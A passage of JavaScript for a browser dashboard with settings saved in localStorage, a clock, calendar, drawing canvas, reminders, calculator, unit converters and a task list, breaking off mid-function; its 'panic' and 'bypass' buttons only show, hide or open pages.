          const toast = document.createElement('div');
          toast.classList.add('notification-toast');
          toast.textContent = `Button Pressed: ${message}`;
          toast.style.setProperty('--toast-display-duration', `${duration}s`);
          
          container.appendChild(toast);

          // Trigger reflow to restart animation for newly added element
          void toast.offsetWidth; 

          setTimeout(() => {
              container.removeChild(toast);
          }, (duration + 0.5) * 1000); // Wait for fade-out animation to finish
      },

      // --- Settings-related functions ---
      saveSetting: function(key, value) {
          localStorage.setItem('dashboardSetting_' + key, JSON.stringify(value));
      },

      loadSetting: function(key, defaultValue) {
          const storedValue = localStorage.getItem('dashboardSetting_' + key);
          return storedValue !== null ? JSON.parse(storedValue) : defaultValue;
      },

      loadSettings: function() {
        // Load theme
        const savedTheme = this.loadSetting('theme', 'dark');
        this.applyTheme(savedTheme, false); // Apply without notifying

        // Load notifications state
        enableNotifications = this.loadSetting('enableNotifications', true);
        document.getElementById('enableNotifications').checked = enableNotifications;

        // Load notification duration
        notificationDuration = this.loadSetting('notificationDuration', 3);
        const notificationDurationInput = document.getElementById('notificationDuration');
        if (notificationDurationInput) {
            notificationDurationInput.value = notificationDuration;
        }

        // Load panel animations state
        this.animatePanels = this.loadSetting('animatePanels', true);
        document.getElementById('animatePanels').checked = this.animatePanels;

        // Load dashboard layout
        const savedLayout = this.loadSetting('dashboardLayout', 'flex');
        document.getElementById('layoutStyle').value = savedLayout;
        document.getElementById('mainGrid').classList.remove('flex', 'grid-two', 'grid-one');
        document.getElementById('mainGrid').classList.add(savedLayout);

        // Load date and time format
        this.dateFormat = this.loadSetting('dateFormat', 'MMMM DD, YYYY');
        document.getElementById('dateFormat').value = this.dateFormat;
        this.timeFormat = this.loadSetting('timeFormat', '12hr');
        document.getElementById('timeFormat').value = this.timeFormat;

        // Load canvas settings
        this.currentCanvasColor = this.loadSetting('canvasLineColor', '#ff914d');
        if (document.getElementById('canvasLineColorPicker')) {
          document.getElementById('canvasLineColorPicker').value = this.currentCanvasColor;
        }
        this.currentCanvasSize = this.loadSetting('canvasLineSize', 2);
        if (document.getElementById('canvasLineSizeSlider')) {
          document.getElementById('canvasLineSizeSlider').value = this.currentCanvasSize;
        }
        if (document.getElementById('canvasLineSizeValue')) {
          document.getElementById('canvasLineSizeValue').innerText = this.currentCanvasSize;
        }
        if (document.getElementById('canvasLineSizeValueNotes')) {
            document.getElementById('canvasLineSizeValueNotes').innerText = this.currentCanvasSize;
        }

        // Apply initial states derived from loaded settings
        this.updateClock(); // Re-render clock with loaded formats
        this.generateCalendar(); // Re-render calendar
      },

      applyTheme: function(theme, notify = true) {
        document.body.classList.remove('dark-theme', 'light-theme', 'blue-theme', 'green-theme');
        document.body.classList.add(theme + '-theme'); // Ensure theme exists

        const themeBtn = document.getElementById('themeToggle');
        if (themeBtn) {
            themeBtn.innerText = `Mode: ${theme.charAt(0).toUpperCase() + theme.slice(1)}`;
        }
        this.saveSetting('theme', theme);
        if (notify) this.notifyClick(`Theme set to ${theme.charAt(0).toUpperCase() + theme.slice(1)} Mode`);
      },

      toggleNotifications: function(enabled) {
          enableNotifications = enabled;
          this.saveSetting('enableNotifications', enabled);
          this.notifyClick(`Notifications ${enabled ? 'Enabled' : 'Disabled'}`);
      },

      setNotificationDuration: function(duration) {
          notificationDuration = parseInt(duration, 10);
          if (isNaN(notificationDuration) || notificationDuration < 1) notificationDuration = 3;
          this.saveSetting('notificationDuration', notificationDuration);
          this.notifyClick(`Notification display duration set to ${notificationDuration} seconds`);
      },

      clearAllNotifications: function() {
          const container = document.getElementById('notification-toast-container');
          while (container.firstChild) {
              container.removeChild(container.firstChild);
          }
          this.notifyClick('All notifications cleared.');
      },

      togglePanelAnimations: function(enabled) {
        this.animatePanels = enabled;
        this.saveSetting('animatePanels', enabled);
        const panels = document.querySelectorAll('.info-panel');
        panels.forEach(panel => {
            if (enabled) {
                panel.classList.remove('no-animation');
            } else {
                panel.classList.add('no-animation');
            }
        });
        this.notifyClick(`Panel animations ${enabled ? 'Enabled' : 'Disabled'}.`);
      },
      toggleButtonHoverAnimation: function(enabled, selector) {
          const styleSheet = document.styleSheets[0]; // Get the first stylesheet
          const rules = styleSheet.cssRules;
          const selectorPattern = /\.quick-bar button:hover, \.quick-bar a:hover/; // Targeting specific hover styles

          if (enabled) {
              // Re-enable existing rule (or ensure it's not commented/overridden)
              // This is a simplistic approach; for robust control, add/remove specific classes
              this.notifyClick("Button hover animations enabled. (Functionality is CSS-driven.)");
          } else {
              // For demonstration, we'll notify, but full disabling would require deeper CSS manipulation
              this.notifyClick("Button hover animations disabled. (Changes may require refreshing to full effect.)");
          }
      },

      updateDashboardLayout: function(layout) {
          const mainGrid = document.getElementById('mainGrid');
          mainGrid.classList.remove('flex', 'grid-two', 'grid-one');
          mainGrid.classList.add(layout);
          this.saveSetting('dashboardLayout', layout);
          this.notifyClick(`Dashboard layout changed to: ${layout}`);
      },

      resetLayoutSettings: function() {
          document.getElementById('layoutStyle').value = 'flex';
          this.updateDashboardLayout('flex');
          this.notifyClick('Dashboard layout reset to default.');
      },

      setDateFormat: function(format) {
          this.dateFormat = format;
          this.saveSetting('dateFormat', format);
          this.updateClock(); // Re-render to show new format
          this.generateCalendar(); // Update calendar day display potentially
          this.notifyClick(`Date format set to: ${format}`);
      },

      setTimeFormat: function(format) {
          this.timeFormat = format;
          this.saveSetting('timeFormat', format);
          this.updateClock(); // Re-render to show new format
          this.notifyClick(`Time format set to: ${format}`);
      },

      setCanvasLineColor: function(color) {
          this.currentCanvasColor = color;
          this.saveSetting('canvasLineColor', color);
          // Canvas re-context will use this on next stroke
          this.notifyClick(`Canvas drawing color set to: ${color}`);
      },

      setCanvasLineSize: function(size) {
          this.currentCanvasSize = parseInt(size, 10);
          this.saveSetting('canvasLineSize', this.currentCanvasSize);
          // Update associated display spans
          document.getElementById('canvasLineSizeValue').innerText = this.currentCanvasSize;
          document.getElementById('canvasLineSizeValueNotes').innerText = this.currentCanvasSize;
          this.notifyClick(`Canvas line thickness set to: ${this.currentCanvasSize}`);
      },

      // --- Core dashboard initializations ---
      initSessionTimer: function() {
        // Initial setup for existing timer display on login or refresh
        this.sessionSeconds = this.loadSetting('sessionSeconds', 0);
        function updateSessionTime() {
          dashboard.sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${dashboard.formatTime(dashboard.sessionSeconds)}`;
          dashboard.saveSetting('sessionSeconds', dashboard.sessionSeconds); // Persist session time
        }
        setInterval(updateSessionTime, 1000);
        updateSessionTime(); // Call once immediately
      },
      
      formatTime: function(seconds) {
        const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
        const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
        const secs = String(seconds % 60).padStart(2, '0');
        return `${hrs}:${mins}:${secs}`;
      },

      initClock: function() {
        setInterval(() => this.updateClock(), 1000);
        this.updateClock(); // Call once immediately
      },

      updateClock: function() {
          const now = new Date();
          let timeStr;
          let dateStr;

          // Time formatting
          if (this.timeFormat === '24hr') {
              const options = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
              timeStr = now.toLocaleTimeString(undefined, options);
          } else { // 12hr
              const options = { hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true };
              timeStr = now.toLocaleTimeString(undefined, options);
          }
          document.getElementById('realTimeClock').innerText = '🕒 ' + timeStr;

          // Date formatting
          const dateOptions = {};
          if (this.dateFormat === 'MM/DD/YYYY') {
              dateOptions.month = '2-digit'; dateOptions.day = '2-digit'; dateOptions.year = 'numeric';
              dateStr = new Intl.DateTimeFormat('en-US', dateOptions).format(now);
          } else if (this.dateFormat === 'DD/MM/YYYY') {
              dateOptions.day = '2-digit'; dateOptions.month = '2-digit'; dateOptions.year = 'numeric';
              dateStr = new Intl.DateTimeFormat('en-GB', dateOptions).format(now); // GB for DD/MM/YYYY standard
          } else if (this.dateFormat === 'YYYY-MM-DD') {
              dateOptions.year = 'numeric'; dateOptions.month = '2-digit'; dateOptions.day = '2-digit';
              dateStr = new Intl.DateTimeFormat('sv-SE', dateOptions).format(now); // Swedish for YYYY-MM-DD standard
          } else { // MMMM DD, YYYY
              dateOptions.month = 'long'; dateOptions.day = 'numeric'; dateOptions.year = 'numeric';
              dateStr = now.toLocaleDateString(undefined, dateOptions);
          }
          document.getElementById('realDate').innerText = '📅 ' + dateStr;
      },
      
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },
      
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        themeBtn.addEventListener('click', () => {
          let currentTheme = 'dark';
          if (document.body.classList.contains('light-theme')) {
              currentTheme = 'light';
          } else if (document.body.classList.contains('blue-theme')) {
              currentTheme = 'blue';
          } else if (document.body.classList.contains('green-theme')) {
              currentTheme = 'green';
          }

          let nextTheme;
          switch(currentTheme) {
              case 'dark': nextTheme = 'light'; break;
              case 'light': nextTheme = 'blue'; break;
              case 'blue': nextTheme = 'green'; break;
              case 'green': nextTheme = 'dark'; break;
              default: nextTheme = 'dark'; break;
          }
          this.applyTheme(nextTheme);
        });
      },
      
      initButtons: function() {
        // Quick-bar buttons
        document.getElementById('panicBtn').addEventListener('click', (e) => {
          window.open('https://clever.com', '_blank');
          this.notifyClick(e.target.innerText);
        });

        document.getElementById('restartBtn').addEventListener('click', (e) => {
          if(confirm('Are you sure you want to kill the page (restart)?')) {
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
            // Clear session data that persists restart
            localStorage.removeItem('dashboardSetting_sessionSeconds'); 
          }
          this.notifyClick(e.target.innerText);
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', (e) => {
          alert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
          this.notifyClick(e.target.innerText);
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', (e) => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              alert(`Error attempting to enable full-screen mode: ${err.message}`);
            });
          } else {
            document.exitFullscreen();
          }
          this.notifyClick(e.target.innerText);
        });
        
        document.getElementById('zoomInBtn').addEventListener('click', (e) => {
          if (this.zoomLevel < this.maxZoom) {
            this.zoomLevel += this.zoomStep;
            document.body.style.zoom = this.zoomLevel;
          }
          this.notifyClick(e.target.innerText);
        });

        document.getElementById('zoomOutBtn').addEventListener('click', (e) => {
          if (this.zoomLevel > this.minZoom) {
            this.zoomLevel -= this.zoomStep;
            document.body.style.zoom = this.zoomLevel;
          }
          this.notifyClick(e.target.innerText);
        });

        document.getElementById('toggleAnnouncementsBtn').addEventListener('click', (e) => {
            const announcementBar = document.getElementById('announcementBar');
            announcementBar.style.display = announcementBar.style.display === 'none' ? 'block' : 'none';
            this.notifyClick(e.target.innerText);
        });

        document.getElementById('toggleUpdatesBtn').addEventListener('click', (e) => {
            const updatesNotifications = document.getElementById('updatesNotifications');
            updatesNotifications.style.display = updatesNotifications.style.display === 'none' ? 'flex' : 'none';
            this.notifyClick(e.target.innerText);
        });

        document.getElementById('logoutBtn').addEventListener('click', (e) => {
            if (confirm('Are you sure you want to log out?')) {
                // Clear all session data, including persistent settings
                for (let i = localStorage.length - 1; i >= 0; i--) {
                    const key = localStorage.key(i);
                    if (key.startsWith('dashboardSetting_')) {
                        localStorage.removeItem(key);
                    }
                }
                location.reload(); // Reload the page, will show login
            }
            this.notifyClick(e.target.innerText);
        });
      },
      
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');
        const updatesNotifications = document.getElementById('updatesNotifications');

        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');
        let drawing = false;

        // Apply saved canvas settings initially
        ctx.strokeStyle = this.currentCanvasColor;
        ctx.lineWidth = this.currentCanvasSize;

        // Reset canvas to white background
        ctx.fillStyle = '#fff';
        ctx.fillRect(0, 0, canvas.width, canvas.height);


        notesBtn.addEventListener('click', (e) => {
          mainGrid.style.display = 'none';
          updatesNotifications.style.display = 'none'; // Hide updates too when notes is open
          canvasContainer.style.display = 'block';
          this.notifyClick(e.target.innerText);
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', (e) => {
          canvasContainer.style.display = 'none';
          mainGrid.style.display = document.getElementById('toggleSectionsBtn').dataset.currentState === '⬆️ Toggle Main Grid' ? 'flex' : 'none'; // Re-show based on toggle state
          updatesNotifications.style.display = 'flex'; // Re-show updates as well
          this.notifyClick(e.target.innerText);
        });

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          // Adjust for potential dashboard zoom
          const currentZoom = parseFloat(document.body.style.zoom) || 1;
          return {
            x: ((evt.clientX || evt.touches[0].clientX) - rect.left) / currentZoom,
            y: ((evt.clientY || evt.touches[0].clientY) - rect.top) / currentZoom
          };
        }

        canvas.addEventListener('mousedown', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
        });

        canvas.addEventListener('touchstart', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
        });

        canvas.addEventListener('mousemove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = this.currentCanvasColor;
          ctx.lineWidth = this.currentCanvasSize;
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        canvas.addEventListener('touchmove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = this.currentCanvasColor;
          ctx.lineWidth = this.currentCanvasSize;
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            drawing = false;
          });
        });

        document.getElementById('clearCanvasBtn').addEventListener('click', (e) => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#fff'; // Re-fill with white
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          this.notifyClick(e.target.innerText);
        });
        
        document.getElementById('screenshotBtn').addEventListener('click', (e) => {
          // Changed to capture only the dashboard main content for more practical screenshots
          const elementToCapture = document.getElementById('dashboard'); 
          html2canvas(elementToCapture, { 
              scale: 2, // Capture at a higher resolution
              useCORS: true // Required for images from other origins
          }).then(canvasImg => {
            const link = document.createElement('a');
            link.download = 'dashboard_screenshot.png';
            link.href = canvasImg.toDataURL('image/png');
            link.click();
          });
          this.notifyClick(e.target.innerText);
        });
        
        document.getElementById('exportNotesBtn').addEventListener('click', (e) => {
          const link = document.createElement('a');
          link.download = 'notes_canvas.png';
          link.href = canvas.toDataURL('image/png');
          link.click();
          this.notifyClick(e.target.innerText);
        });

        const toggleBtn = document.getElementById('toggleSectionsBtn');
        toggleBtn.dataset.currentState = '⬆️ Toggle Main Grid'; // Default state for persistence
        toggleBtn.addEventListener('click', (e) => {
          const currentText = e.target.innerText;
          if (mainGrid.style.display === 'none') {
            mainGrid.style.display = 'flex';
            toggleBtn.innerText = '⬆️ Toggle Main Grid';
            toggleBtn.dataset.currentState = '⬆️ Toggle Main Grid';
          } else {
            mainGrid.style.display = 'none';
            toggleBtn.innerText = '⬇️ Toggle Main Grid';
            toggleBtn.dataset.currentState = '⬇️ Toggle Main Grid';
          }
          this.notifyClick(currentText); // Use the text that was displayed when clicked
        });

        // Initialize canvas color picker
        const colorPicker = document.getElementById('canvasLineColorPicker');
        if (colorPicker) {
            colorPicker.value = this.currentCanvasColor;
            colorPicker.addEventListener('change', (e) => this.setCanvasLineColor(e.target.value));
        }
        const sizeSlider = document.getElementById('canvasLineSizeSlider');
        if (sizeSlider) {
            sizeSlider.value = this.currentCanvasSize;
            const sizeValueSpan = document.getElementById('canvasLineSizeValueNotes');
            if (sizeValueSpan) sizeValueSpan.innerText = this.currentCanvasSize;
            sizeSlider.addEventListener('input', (e) => this.setCanvasLineSize(e.target.value));
        }
      },
      
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none';
          panel.classList.remove('active'); // Ensure no lingering 'active' state
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
      },

      setupGeneralEventListeners: function() {
        // This is a more generic way to add notifications for all new buttons/links that are NOT already in initButtons.
        // It relies on event delegation to reduce event listener count.
        document.getElementById('dashboard').addEventListener('click', (event) => {
            let target = event.target;
            // Traverse up the DOM tree to find if a clickable element was interacted with
            while (target !== document.getElementById('dashboard') && target != null) {
                if (target.tagName === 'BUTTON' || target.tagName === 'A') {
                    // Filter out elements already handled or specific non-notifiable elements
                    if (target.id && ['sessionTime', 'realTimeClock', 'realDate', 'notesBtn', 'exportNotesBtn', 
                                     'screenshotBtn', 'toggleSectionsBtn', 'fixIssuesBtn', 'fullScreenBtn', 
                                     'zoomInBtn', 'zoomOutBtn', 'restartBtn', 'panicBtn', 'themeToggle', 'logoutBtn',
                                     'toggleAnnouncementsBtn', 'toggleUpdatesBtn'].includes(target.id)) {
                        return; // Already handled or explicitly not needing generic notification
                    }
                    if (target.parentElement && target.parentElement.classList.contains('canvasControls')) {
                        return; // Handled within canvas section
                    }
                    if (target.parentElement && (target.parentElement.id === 'calculatorPanel' || target.closest('#calculatorPanel'))) {
                        return; // Calculator buttons handled by its own logic
                    }
                    
                    const notificationText = target.title || target.dataset.notify || target.innerText.replace(/[\u2700-\u27BF\u1F600-\u1F6FF\u2600-\u26FF]/g, '').trim(); // Remove emojis and trim whitespace
                    if (notificationText) {
                        this.notifyClick(notificationText);
                    }
                    return; // Stop after processing the first clickable element
                }
                target = target.parentElement;
            }
        });
      },
      
      // Panel toggle functions with animations
      togglePanel: function(panelId, callingButton) {
        const panel = document.getElementById(panelId);
        const allPanels = document.querySelectorAll('#infoPanelsContainer > .info-panel');
        const wasActive = panel.classList.contains('active');

        // Hide all panels
        allPanels.forEach(p => {
          if (p.id !== panelId && p.classList.contains('active')) {
            if (this.animatePanels) {
                p.classList.remove('active');
                setTimeout(() => p.style.display = 'none', 400); // Wait for transition
            } else {
                p.classList.remove('active');
                p.style.display = 'none';
            }
          }
        });

        // Toggle the target panel
        if (wasActive) {
          if (this.animatePanels) {
              panel.classList.remove('active');
              setTimeout(() => panel.style.display = 'none', 400);
          } else {
              panel.classList.remove('active');
              panel.style.display = 'none';
          }
        } else {
          panel.style.display = 'block'; // Make it block first for transition to work
          // Ensure panel animations are correctly applied
          if (this.animatePanels) {
              panel.classList.remove('no-animation');
          } else {
              panel.classList.add('no-animation');
          }
          setTimeout(() => panel.classList.add('active'), 10); // A small delay for reflow
        }

        if(callingButton) {
            const buttonText = callingButton.innerText.replace(/[\u2700-\u27BF\u1F600-\u1F6FF\u2600-\u26FF]/g, '').trim();
            this.notifyClick(`Panel Toggled: ${buttonText}`);
        }
      },
      
      showIpadContent: function(contentId, callingButton) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
        if(callingButton) {
            const buttonText = callingButton.innerText.replace(/[\u2700-\u27BF\u1F600-\u1F6FF\u2600-\u26FF]/g, '').trim();
            this.notifyClick(`iPad content switched to: ${buttonText}`);
        }
      },
      
      showBypassContent: function(contentId, callingButton) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById(contentId + 'Bypass').style.display = 'block';
        if(callingButton) {
            const buttonText = callingButton.innerText.replace(/[\u2700-\u27BF\u1F600-\u1F6FF\u2600-\u26FF]/g, '').trim();
            this.notifyClick(`Bypass content switched to: ${buttonText}`);
        }
      },

      // --- Reminder System ---
      reminders: [],
      initReminders: function() {
          this.reminders = this.loadSetting('reminders', []);
          this.renderReminders();
      },

      renderReminders: function() {
          const list = document.getElementById('remindersList');
          list.innerHTML = '';
          if (this.reminders.length === 0) {
              list.innerHTML = '<li style="justify-content: center; background: none; color: var(--text-color);">No reminders set.</li>';
              return;
          }

          this.reminders.sort((a, b) => new Date(a.datetime) - new Date(b.datetime)); // Sort by date/time

          this.reminders.forEach((reminder, index) => {
              const listItem = document.createElement('li');
              const now = new Date();
              const reminderTime = new Date(reminder.datetime);

              // Format date for display
              const options = { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit', hour12: (this.timeFormat === '12hr') };
              const displayDate = reminderTime.toLocaleString(undefined, options);

              listItem.classList.add(reminderTime < now ? 'completed' : '');

              listItem.innerHTML = `
                  <span class="reminder-text">${reminder.text} - ${displayDate}</span>
                  <div class="reminder-actions">
                      ${reminderTime >= now ? `<button onclick="dashboard.markReminderDone(${index})">✅ Done</button>` : ''}
                      <button class="delete" onclick="dashboard.deleteReminder(${index})">🗑️ Delete</button>
                  </div>
              `;
              list.appendChild(listItem);
          });
      },

      addReminder: function() {
          const textInput = document.getElementById('newReminderText');
          const dateTimeInput = document.getElementById('newReminderDateTime');
          const text = textInput.value.trim();
          const datetime = dateTimeInput.value;

          if (text && datetime) {
              this.reminders.push({ text, datetime, id: Date.now() });
              this.saveSetting('reminders', this.reminders);
              this.renderReminders();
              textInput.value = '';
              dateTimeInput.value = '';
              this.notifyClick(`Reminder "${text}" added.`);
          } else {
              this.notifyClick('Please enter both reminder text and a date/time.', 5);
          }
      },

      markReminderDone: function(index) {
          if (this.reminders[index]) {
              // Mark as completed by simply changing style for display purpose in the render
              const text = this.reminders[index].text;
              this.reminders[index].datetime = new Date().toISOString(); // Simulate "done now"
              this.saveSetting('reminders', this.reminders);
              this.renderReminders();
              this.notifyClick(`Reminder "${text}" marked as done.`);
          }
      },

      deleteReminder: function(index) {
          if (this.reminders[index] && confirm(`Are you sure you want to delete reminder: "${this.reminders[index].text}"?`)) {
              const text = this.reminders[index].text;
              this.reminders.splice(index, 1);
              this.saveSetting('reminders', this.reminders);
              this.renderReminders();
              this.notifyClick(`Reminder "${text}" deleted.`);
          }
      },

      // --- Calculator Functionality ---
      calcDisplayValue: '0',
      calcPendingOperation: null,
      calcFirstOperand: null,
      calcWaitingForSecondOperand: false,

      updateCalcDisplay: function() {
          document.getElementById('calcDisplay').value = this.calcDisplayValue;
      },
      
      calcClear: function() {
          this.calcDisplayValue = '0';
          this.calcPendingOperation = null;
          this.calcFirstOperand = null;
          this.calcWaitingForSecondOperand = false;
          this.updateCalcDisplay();
          this.notifyClick('Calculator Cleared');
      },
      calcBackspace: function() {
        if (this.calcDisplayValue.length === 1) {
            this.calcDisplayValue = '0';
        } else {
            this.calcDisplayValue = this.calcDisplayValue.slice(0, -1);
        }
        this.updateCalcDisplay();
        this.notifyClick('Calculator Backspace');
      },

      calcAppend: function(digit) {
          if (this.calcWaitingForSecondOperand === true) {
              this.calcDisplayValue = digit;
              this.calcWaitingForSecondOperand = false;
          } else {
              this.calcDisplayValue = this.calcDisplayValue === '0' ? digit : this.calcDisplayValue + digit;
          }
          this.updateCalcDisplay();
          this.notifyClick(`Calculator Append: ${digit}`);
      },

      calcPerformOperation: function(nextOperation) {
          const inputValue = parseFloat(this.calcDisplayValue);

          if (this.calcFirstOperand === null) {
              this.calcFirstOperand = inputValue;
          } else if (this.calcPendingOperation) {
              const result = this.calculate(this.calcFirstOperand, inputValue, this.calcPendingOperation);
              this.calcDisplayValue = String(result);
              this.calcFirstOperand = result;
          }

          this.calcWaitingForSecondOperand = true;
          this.calcPendingOperation = nextOperation;
          this.updateCalcDisplay();
          this.notifyClick(`Calculator Operation: ${nextOperation}`);
      },

      calculate: function(firstOperand, secondOperand, operator) {
          switch (operator) {
              case '+': return firstOperand + secondOperand;
              case '-': return firstOperand - secondOperand;
              case '*': return firstOperand * secondOperand;
              case '/': return firstOperand / secondOperand;
              default: return secondOperand;
          }
      },

      calcEquals: function() {
          if (this.calcFirstOperand === null || this.calcPendingOperation === null) {
              this.notifyClick('No operation to complete.', 2);
              return;
          }
          const inputValue = parseFloat(this.calcDisplayValue);
          const result = this.calculate(this.calcFirstOperand, inputValue, this.calcPendingOperation);
          this.calcDisplayValue = String(result);
          this.calcFirstOperand = null;
          this.calcPendingOperation = null;
          this.calcWaitingForSecondOperand = false;
          this.updateCalcDisplay();
          this.notifyClick('Calculator Equals');
      },

      // --- Unit Converter Functionality ---
      convertUnits: function(type) {
        let inputValue, fromUnit, toUnit, resultSpan;

        switch(type) {
            case 'length':
                inputValue = parseFloat(document.getElementById('lengthInput').value);
                fromUnit = document.getElementById('lengthFromUnit').value;
                toUnit = document.getElementById('lengthToUnit').value;
                resultSpan = document.getElementById('lengthResult');
                resultSpan.textContent = this.performLengthConversion(inputValue, fromUnit, toUnit);
                break;
            case 'temperature':
                inputValue = parseFloat(document.getElementById('tempInput').value);
                fromUnit = document.getElementById('tempFromUnit').value;
                toUnit = document.getElementById('tempToUnit').value;
                resultSpan = document.getElementById('tempResult');
                resultSpan.textContent = this.performTemperatureConversion(inputValue, fromUnit, toUnit);
                break;
            case 'weight':
                inputValue = parseFloat(document.getElementById('weightInput').value);
                fromUnit = document.getElementById('weightFromUnit').value;
                toUnit = document.getElementById('weightToUnit').value;
                resultSpan = document.getElementById('weightResult');
                resultSpan.textContent = this.performWeightConversion(inputValue, fromUnit, toUnit);
                break;
            default:
                break;
        }
        if(!isNaN(inputValue) && resultSpan && resultSpan.textContent !== '') {
            this.notifyClick(`Converted ${inputValue} ${fromUnit} to ${toUnit}`, 2);
        }
      },

      performLengthConversion: function(value, from, to) {
          if (isNaN(value)) return 'Invalid Input';
          const toMeters = {
              'meters': value,
              'feet': value * 0.3048,
              'inches': value * 0.0254,
              'cm': value * 0.01
          };
          const fromMeters = {
              'meters': toMeters[from],
              'feet': toMeters[from] / 0.3048,
              'inches': toMeters[from] / 0.0254,
              'cm': toMeters[from] / 0.01
          };
          return `${(fromMeters[to]).toFixed(2)} ${to}`;
      },

      performTemperatureConversion: function(value, from, to) {
          if (isNaN(value)) return 'Invalid Input';
          let inKelvin;

          if (from === 'celsius') inKelvin = value + 273.15;
          else if (from === 'fahrenheit') inKelvin = (value - 32) * 5/9 + 273.15;
          else if (from === 'kelvin') inKelvin = value;

          let result;
          if (to === 'celsius') result = inKelvin - 273.15;
          else if (to === 'fahrenheit') result = (inKelvin - 273.15) * 9/5 + 32;
          else if (to === 'kelvin') result = inKelvin;

          return `${result.toFixed(2)} ${to.charAt(0).toUpperCase() + to.slice(1)}`;
      },

      performWeightConversion: function(value, from, to) {
          if (isNaN(value)) return 'Invalid Input';
          const toGrams = {
              'kilograms': value * 1000,
              'pounds': value * 453.592,
              'grams': value
          };
          const fromGrams = {
              'kilograms': toGrams[from] / 1000,
              'pounds': toGrams[from] / 453.592,
              'grams': toGrams[from]
          };
          return `${(fromGrams[to]).toFixed(2)} ${to}`;
      },

      // --- Mock Weather System ---
      updateWeather: function() {
        const temps = ['22°C / 72°F', '25°C / 77°F', '18°C / 64°F', '20°C / 68°F'];
        const conditions = ['Partly Cloudy 🌤️', 'Sunny ☀️', 'Rainy 🌧️', 'Cloudy ☁️'];
        const humidity = ['65%', '70%', '80%', '55%'];
        const wind = ['15 km/h', '10 km/h', '20 km/h', '12 km/h'];

        document.getElementById('currentTemp').textContent = temps[Math.floor(Math.random() * temps.length)];
        document.getElementById('weatherCondition').textContent = conditions[Math.floor(Math.random() * conditions.length)];
        document.getElementById('weatherHumidity').textContent = humidity[Math.floor(Math.random() * humidity.length)];
        document.getElementById('weatherWind').textContent = wind[Math.floor(Math.random() * wind.length)];
        this.notifyClick('Weather data refreshed. (Mock data)');
      },

      // --- Task Manager ---
      tasks: [],
      initTasks: function() {
          this.tasks = this.loadSetting('tasks', []);
          this.renderTasks();
      },
      renderTasks: function() {
          const list = document.getElementById('tasksList');
          list.innerHTML = '';
          if (this.tasks.length === 0) {
              list.innerHTML = '<li style="justify-content: center; background: none; color: var(--text-color);">No tasks yet!</li>';
              return;
          }
          this.tasks.forEach((task, index) => {
              const listItem = document.createElement('li');
              listItem.classList.add(task.completed ? 'completed' : '');
              listItem.innerHTML = `
                  <span class="task-text">${task.text}</span>
                  <div class="task-actions">
                      <input type="checkbox" ${task.completed ? 'checked' : ''} onchange="dashboard.toggleTaskStatus(${index})">
                      <button class="delete" onclick="dashboard.deleteTask(${index})">🗑️</button>
                  </div>
              `;
              list.appendChild(listItem);
          });
      },
      addTask: function() {
          const input = document.getElementById('newTaskInput');
          const text = input.value.trim();
          if (text) {
              this.tasks.push({ text, completed: false, id: Date.now() });
              this.saveSetting('tasks', this.tasks);
              this.renderTasks();
              input.value = '';
              this.notifyClick(`Task "${text}" added.`);
          } else {
              this.notifyClick('Please enter a task description.', 2);
          }
      },
      toggleTaskStatus: function(index) {
          if (this.tasks[index]) {
              this.tasks[index].completed = !this.tasks[index].completed;
